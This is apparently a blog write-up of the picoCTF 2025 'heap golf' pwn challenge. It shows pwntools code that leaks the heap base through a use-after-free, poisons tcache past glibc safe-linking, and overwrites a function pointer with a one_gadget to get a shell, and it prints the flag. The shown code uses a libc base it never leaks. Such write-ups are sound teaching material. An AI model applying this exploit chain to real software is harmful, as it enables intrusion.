---
title: "heap golf — picoCTF 2025"
date: 2026-03-18
draft: false
description: "A tcache poisoning challenge requiring precise heap grooming to overwrite a function pointer."
tags: ["heap", "tcache", "exploitation", "glibc"]
ctf: "picoCTF 2025"
difficulty: "hard"
category: "pwn"
toc: true
---

## Challenge

**Category:** pwn  
**Points:** 400  
**Description:** "Swing carefully. One bad shot and you're in the sand trap."

A 64-bit ELF, full protections: CANARY, NX, PIE, RELRO FULL. No `system()` import. glibc 2.35.

```bash
checksec --file=./heap_golf
[*] './heap_golf'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

## Approach

The binary implements a simple note manager: allocate, edit, free, print. Classic heap challenge setup.

Initial analysis with `ghidra` revealed:
1. **UAF on free**: the note pointer is not zeroed after `free()` → use-after-free primitive
2. **Function pointer table**: a global array of function pointers used for "print" dispatch, located at a predictable offset from heap base

With glibc 2.35, tcache has been hardened with safe-linking (pointer mangling). The plan:

1. Leak heap base via dangling pointer print
2. Unmangle the tcache fd pointer
3. Poison tcache to return the function pointer table address
4. Overwrite a print handler with `one_gadget`

## Solution

### Step 1: Leak heap address

```python
alloc(0x28, b"A" * 0x28)   # chunk 0
alloc(0x28, b"B" * 0x28)   # chunk 1 (prevents consolidation)
free(0)
# UAF: chunk 0 is freed but pointer lives
# tcache fd is mangled: addr >> 12 XOR (heap_base >> 12)
raw = u64(print_note(0).ljust(8, b'\x00'))
heap_key = raw  # this IS the mangled pointer
heap_base = heap_key << 12
log.info(f"heap base: {hex(heap_base)}")
```

### Step 2: Tcache poisoning

```python
# Safe-linking unmangle: real_ptr = mangled XOR (heap_base >> 12)
target = heap_base + FUNC_TABLE_OFFSET

alloc(0x28, b"C" * 0x28)   # chunk 2
free(0)
free(2)   # tcache bin: [chunk2 -> chunk0]

# Overwrite chunk2's fd to point at target (mangled)
mangled_target = target ^ (heap_base >> 12)
edit(2, p64(mangled_target))

# Drain tcache: first alloc returns chunk2
alloc(0x28, b"D" * 0x28)
# Second alloc returns our target
fake_chunk = alloc(0x28, b"\x00" * 0x28)
```

### Step 3: One-gadget overwrite

```python
# Find one_gadget candidates
# $ one_gadget /lib/x86_64-linux-gnu/libc.so.6
# Constraints: [rsp+0x50] == NULL (satisfied at this call site)
ONE_GADGET = libc.address + 0xebcf8

# Overwrite function pointer table entry for slot 0
edit(fake_chunk, p64(ONE_GADGET))

# Trigger: call print on any chunk → dispatches through poisoned table
print_note(1)

# shell!
p.interactive()
```

### Full exploit

```python
from pwn import *

p = process('./heap_golf')
elf = ELF('./heap_golf')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
FUNC_TABLE_OFFSET = 0x13f0  # from ghidra analysis

# ... (abbreviated — full script at gist link)

p.interactive()
```

## Flag

```
picoCTF{h34p_m4st3r_n0_s4nd_tr4p_f0r_y0u_d3adb33f}
```

## Lessons Learned

- **Safe-linking is beatable** if you can leak the heap key. The UAF print gave it away immediately.
- **ghidra + pwndbg** together: ghidra for static analysis of offsets, pwndbg for dynamic heap state.
- Always check `one_gadget` constraints against the actual register state at the call site — first candidate rarely works.

{{< callout type="tip" >}}
Use `pwndbg`'s `bins` command to visualize tcache state in real time. Makes poisoning attempts much clearer than raw memory inspection.
{{< /callout >}}
